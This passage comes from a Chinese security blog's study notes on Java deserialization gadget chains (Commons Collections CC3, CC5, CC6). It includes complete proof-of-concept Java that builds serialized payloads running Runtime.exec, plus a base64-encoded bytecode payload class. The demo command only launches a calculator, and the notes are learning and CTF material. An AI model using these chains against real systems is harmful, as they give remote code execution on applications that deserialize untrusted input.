class="hljs-string">&quot;MTIzL1BheWxvYWQ7AQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVy&quot;</span> +<br>                <span class="hljs-string">&quot;bmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRl&quot;</span> +<br>                <span class="hljs-string">&quot;cm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHACkBAKYo&quot;</span> +<br>                <span class="hljs-string">&quot;TGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3Jn&quot;</span> +<br>                <span class="hljs-string">&quot;L2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBh&quot;</span> +<br>                <span class="hljs-string">&quot;Y2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRl&quot;</span> +<br>                <span class="hljs-string">&quot;cmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJh&quot;</span> +<br>                <span class="hljs-string">&quot;dG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxp&quot;</span> +<br>                <span class="hljs-string">&quot;emVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEABG1haW4BABYoW0xqYXZhL2xhbmcvU3RyaW5nOylW&quot;</span> +<br>                <span class="hljs-string">&quot;AQAEYXJncwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAAY8aW5pdD4BAAMoKVYHACoBAApTb3VyY2VG&quot;</span> +<br>                <span class="hljs-string">&quot;aWxlAQAMUGF5bG9hZC5qYXZhDAAdAB4HACsMACwALQEAEGdub21lLWNhbGN1bGF0b3IMAC4ALwEA&quot;</span> +<br>                <span class="hljs-string">&quot;E29yZy9sY2RtMTIzL1BheWxvYWQBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwv&quot;</span> +<br>                <span class="hljs-string">&quot;eHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFu&quot;</span> +<br>                <span class="hljs-string">&quot;L2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQATamF2YS9pby9JT0V4Y2VwdGlvbgEA&quot;</span> +<br>                <span class="hljs-string">&quot;EWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEA&quot;</span> +<br>                <span class="hljs-string">&quot;BGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAA&quot;</span> +<br>                <span class="hljs-string">&quot;AAQAAQAHAAgAAgAJAAAAPwAAAAMAAAABsQAAAAIACgAAAAYAAQAAAA8ACwAAACAAAwAAAAEADAAN&quot;</span> +<br>                <span class="hljs-string">&quot;AAAAAAABAA4ADwABAAAAAQAQABEAAgASAAAABAABABMAAQAHABQAAgAJAAAASQAAAAQAAAABsQAA&quot;</span> +<br>                <span class="hljs-string">&quot;AAIACgAAAAYAAQAAABQACwAAACoABAAAAAEADAANAAAAAAABAA4ADwABAAAAAQAVABYAAgAAAAEA&quot;</span> +<br>                <span class="hljs-string">&quot;FwAYAAMAEgAAAAQAAQATAAkAGQAaAAEACQAAACsAAAABAAAAAbEAAAACAAoAAAAGAAEAAAAYAAsA&quot;</span> +<br>                <span class="hljs-string">&quot;AAAMAAEAAAABABsAHAAAAAEAHQAeAAIACQAAAEAAAgABAAAADiq3AAG4AAISA7YABFexAAAAAgAK&quot;</span> +<br>                <span class="hljs-string">&quot;AAAADgADAAAAGQAEABoADQAbAAsAAAAMAAEAAAAOAAwADQAAABIAAAAEAAEAHwABACAAAAACACE=&quot;</span>);<br>        TemplatesImpl templates = <span class="hljs-keyword">new</span> TemplatesImpl();<br>        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;bytes&#125;);<br>        setFieldValue(templates,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;lcdm123&quot;</span>);<br>        <span class="hljs-comment">//setFieldValue(templates,&quot;_tfactory&quot;, new TransformerFactoryImpl());</span><br><br>        Transformer[] faketransformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)&#125;;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(TrAXFilter.class),<br>                <span class="hljs-keyword">new</span> InstantiateTransformer(<span class="hljs-keyword">new</span> Class[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;templates&#125;)<br>        &#125;;<br>        HashMap inerMap = <span class="hljs-keyword">new</span> HashMap();<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(faketransformers);<br>        Map outerMap = LazyMap.decorate(inerMap, chainedTransformer);<br><br>        HashMap&lt;TiedMapEntry,String&gt; hashMap = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(outerMap,<span class="hljs-string">&quot;lcdm123&quot;</span>);<br>        hashMap.put(tiedMapEntry,<span class="hljs-string">&quot;test123&quot;</span>);<br>        outerMap.remove(<span class="hljs-string">&quot;lcdm123&quot;</span>);<br><br>        setFieldValue(chainedTransformer,<span class="hljs-string">&quot;iTransformers&quot;</span>,transformers);<br><br>        <span class="hljs-comment">// 序列化</span><br>        ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream objectOutputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(byteArrayOutputStream);<br>        objectOutputStream.writeObject(hashMap);<br>        objectOutputStream.close();<br><br>        <span class="hljs-comment">// 反序列化</span><br>        ByteArrayInputStream byteArrayInputStream = <span class="hljs-keyword">new</span> ByteArrayInputStream(byteArrayOutputStream.toByteArray());<br>        ObjectInputStream objectInputStream = <span class="hljs-keyword">new</span> ObjectInputStream(byteArrayInputStream);<br>        objectInputStream.readObject();<br>        objectInputStream.close();<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException </span>&#123;<br>        Field field = obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-keyword">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211111204553382.png" alt="image-20211111204553382"></p><p>在上面的代码中可以不用使用<code>_tfactiry</code>，因为它是瞬态的属性本身没法序列化，所以 POC 中不使用它也不会有影响</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211111212011740.png" alt="image-20211111212011740"></p><p>在反序列化时它重写的<code>readobject()</code>方法会自动初始化改变量</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211111212150797.png" alt="image-20211111212150797"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>感觉CC链越往后面，这些链子的相关性就越大，学起来就越容易。好好学习，天天向上。</p><p>参考文章</p><p>P神代码审计</p><p><a href="https://ego00.blog.csdn.net/article/details/119780324">https://ego00.blog.csdn.net/article/details/119780324</a></p><p><a href="https://su18.org/post/ysoserial-su18-2/#commonscollections3">https://su18.org/post/ysoserial-su18-2/#commonscollections3</a></p><p><a href="https://y4tacker.blog.csdn.net/article/details/119084222">https://y4tacker.blog.csdn.net/article/details/119084222</a></p><p><a href="https://www.guildhab.top/2020/09/java-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e9-%e8%a7%a3%e5%af%86-ysoserial-commonscollections3-pop-chains/">https://www.guildhab.top/2020/09/java-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e9-%e8%a7%a3%e5%af%86-ysoserial-commonscollections3-pop-chains/</a></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计</tag>
      
      <tag>Web</tag>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java CC6</title>
    <link href="/2021/11/11/Java-CC6/"/>
    <url>/2021/11/11/Java-CC6/</url>
    
    <content type="html"><![CDATA[<h1 id="Java-CC链6"><a href="#Java-CC链6" class="headerlink" title="Java CC链6"></a>Java CC链6</h1><h2 id="构造思路"><a href="#构造思路" class="headerlink" title="构造思路"></a>构造思路</h2><p>在 CC6 的链中，还是想利用 LazyMap 类去调用 <code>get()</code> 函数来触发命令执行，这里和 CC5 一样选择了<code>TiedMapEntry</code>类，在这个类中存在一个<code>get()</code>方法</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211110084112675.png" alt="image-20211110084112675"></p><p>在 CC5 中也是利用了这个点，但是它是通过<code>TiedMapEntry</code>的<code>toString()</code>方法调用的，但是CC6中是利用<code>TiedMapEntry</code>类的<code>hashCode()</code>方法调用到<code>getvalue()</code>中的<code>get()</code>方法</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211110084301463.png" alt="image-20211110084301463"></p><p>这里又和 URLDNS 链有了相似之处，需要调用 <code>hashCode()</code> 我们就能够想到 URLDNS 链中的一些方法，利用<code>HashMap</code>类去调用到<code>hashCode()</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211110092915169.png" alt="image-20211110092915169"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211110092951242.png" alt="image-20211110092951242"></p><h2 id="构造POC"><a href="#构造POC" class="headerlink" title="构造POC"></a>构造POC</h2><p>先尝试自己构造一下POC</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.lcdm123;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC6</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,<br>                        <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;,<br>                        <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,<br>                        <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;,<br>                        <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<br>                        <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<br>                        <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;gnome-calculator&quot;</span>&#125;)<br>        &#125;;<br>        HashMap inerMap = <span class="hljs-keyword">new</span> HashMap();<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        Map outermap = LazyMap.decorate(inerMap,chainedTransformer);<br><br>        HashMap&lt;TiedMapEntry, Integer&gt; hashMap = <span class="hljs-keyword">new</span> HashMap&lt;TiedMapEntry, Integer&gt;();<br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(outermap,<span class="hljs-string">&quot;lcdm123&quot;</span>);<br>        hashMap.put(tiedMapEntry,<span class="hljs-number">1</span>);<br><br>        ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream objectOutputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(byteArrayOutputStream);<br>        objectOutputStream.writeObject(hashMap);<br>        objectOutputStream.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>???? 为什么在序列化的时候就弹出来了计算器</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211110094507745.png" alt="image-20211110094507745"></p><h2 id="真正的POC"><a href="#真正的POC" class="headerlink" title="真正的POC"></a>真正的POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.lcdm123;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC6</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException </span>&#123;<br>        Transformer[] faketransformer = <span class="hljs-keyword">new</span> Transformer[]&#123;<span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)&#125;;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,<br>                        <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;,<br>                        <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,<br>                        <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;,<br>                        <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<br>                        <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<br>                        <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;gnome-calculator&quot;</span>&#125;)<br>        &#125;;<br>        HashMap inerMap = <span class="hljs-keyword">new</span> HashMap();<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(faketransformer);<br>        Map outermap = LazyMap.decorate(inerMap,chainedTransformer);<br><br>        HashMap&lt;TiedMapEntry, Integer&gt; hashMap = <span class="hljs-keyword">new</span> HashMap&lt;TiedMapEntry, Integer&gt;();<br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(outermap,<span class="hljs-string">&quot;lcdm123&quot;</span>);<br>        hashMap.put(tiedMapEntry,<span class="hljs-number">1</span>);<br>        outermap.remove(<span class="hljs-string">&quot;lcdm123&quot;</span>);<br><br>        Field field = ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        field.setAccessible(<span class="hljs-keyword">true</span>);<br>        field.set(chainedTransformer,transformers);<br><br>        ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream objectOutputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(byteArrayOutputStream);<br>        objectOutputStream.writeObject(hashMap);<br>        objectOutputStream.close();<br>        System.out.println(Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray()));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211110171250594.png" alt="image-20211110171250594"></p><p>将自己的代码和真正的POC对比一下发现了有几点不同</p><ol><li>代码中最开始使用了一个<code>faketransformer</code></li><li><code>outmap</code>使用了一次<code>remove()</code>方法</li></ol><h2 id="Why？"><a href="#Why？" class="headerlink" title="Why？"></a>Why？</h2><p>为什么这里要使用 <code>faketransformer</code>？</p><p>这个问题在 P神的代码审计5 中有相关解释</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211110224845472.png" alt="image-20211110224845472"></p><p>主要还是为了避免本地调试的时候触发命令执行</p><p>为什么要使用<code>remove()</code>?</p><p>首先在未使用<code>remove()</code>时是不能反序列化调用成功的</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211110230055818.png" alt="image-20211110230055818"></p><p>调试中发现如果这里不使用<code>remove()</code>移除时，代码就会直接跳过 if 直接执行 else 返回结果，造成了代码的不执行。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>经过这几天的学习，对于 CC 链的构造已经差不多能够看懂了，但是在构造 POC 的时候还是有一些细节处理不到位，毕竟细节决定成败，所以继续努力吧。最后借用P神的一句话：<strong>独立思考很重要</strong></p><p>参考文章</p><p>P神代码审计</p><p><a href="https://su18.org/post/ysoserial-su18-2/#commonscollections6">https://su18.org/post/ysoserial-su18-2/#commonscollections6</a></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计</tag>
      
      <tag>Web</tag>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java CC链5</title>
    <link href="/2021/11/10/Java-CC%E9%93%BE5/"/>
    <url>/2021/11/10/Java-CC%E9%93%BE5/</url>
    
    <content type="html"><![CDATA[<h1 id="Java-CC5"><a href="#Java-CC5" class="headerlink" title="Java CC5"></a>Java CC5</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在打东华杯的时候遇见一个 java 反序列化的题目，但是当时没有学习 Java CC5 的链子所以死活没有做出来，所以趁着这个机会一起学习一下 CC5 的链子。</p><blockquote><p>当时没有做出来是不知道怎么让 toString 方法自动调用，太亏了，后面问学长，学长都懒得回答这么菜的问题，属实是太菜了呀</p></blockquote><h2 id="CC5-分析"><a href="#CC5-分析" class="headerlink" title="CC5 分析"></a>CC5 分析</h2><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211108222024890.png" alt="image-20211108222024890"></p><p>这个链子和 CC1的前大半部分是一样的，目的都是要调用到 <code>LazyMap</code> 类的 <code>get()</code> 然后触发命令执行。CC5链子使用了<code>BadAttributeValueExpException</code>类来代替<code>AnnotationInvocationHandler</code>类，还利用了一个新的类来调用<code>LazyMap</code>的<code>get</code>方法</p><p>在 CC1 中我们利用<code>LazyMap</code>类调用<code>get()</code>时造成命令执行的方法构造了利用链，不过在后面的版本中修复了<code>AnnotationInvocationHandler</code>类，所以这里就找到了一个新的利用链(CC5)</p><p>首先找到一个可以利用的<code>get()</code>方法，所以就 找到了<code>TideMapEntry</code>类</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211108220006308.png" alt="image-20211108220006308"></p><p>这里虽然有<code>get()</code>方法，但是要怎么触发呢？在这个类中发现<code>toString()</code>方法调用到了这个 函数，所以这里的问题就变成了如何调用到<code>toString()</code>方法？</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211108220120895.png" alt="image-20211108220120895"></p><p>这里就利用到了<code>BadAttributeValueExpException</code>类，这个类的<code>readObject()</code>方法中会调用<code>toString()</code>方法 </p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211108220411317.png" alt="image-20211108220411317"></p><p>所以我们的思路就清楚了，借助<code>BadAttributeValueExpException</code>类反序列化时调用<code>TideMapEntry</code>类 <code>toString()</code>最后调用到<code>getalue()</code>中的<code>get()</code>触发命令执行</p><p>POC中大部分和CC1相同</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.lcdm123;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC5</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException, IOException </span>&#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>          <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>          <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,<br>                  <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;,<br>                  <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]&#125;),<br>          <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,<br>                  <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;,<br>                  <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]&#125;),<br>          <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<br>                  <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<br>                  <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;gnome-calculator&quot;</span>&#125;)<br>        &#125;;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        Map inermap = <span class="hljs-keyword">new</span> HashMap();<br>        Map outermap = LazyMap.decorate(inermap,chainedTransformer);<br><br>        BadAttributeValueExpException expException = <span class="hljs-keyword">new</span> BadAttributeValueExpException(<span class="hljs-keyword">null</span>);<br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(outermap,<span class="hljs-string">&quot;lcdm123&quot;</span>);<br><br>        Class clazz = Class.forName(<span class="hljs-string">&quot;javax.management.BadAttributeValueExpException&quot;</span>);<br>        Field val = clazz.getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        val.setAccessible(<span class="hljs-keyword">true</span>);<br>        val.set(expException, tiedMapEntry);<br><br>        ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream objectOutputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(byteArrayOutputStream);<br>        objectOutputStream.writeObject(expException);<br>        objectOutputStream.close();<br><br>        ByteArrayInputStream byteArrayInputStream = <span class="hljs-keyword">new</span> ByteArrayInputStream(byteArrayOutputStream.toByteArray());<br>        ObjectInputStream objectInputStream = <span class="hljs-keyword">new</span> ObjectInputStream(byteArrayInputStream);<br>        objectInputStream.readObject();<br>        objectInputStream.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211108221156107.png" alt="image-20211108221156107"></p><h2 id="东华杯-Java-复现"><a 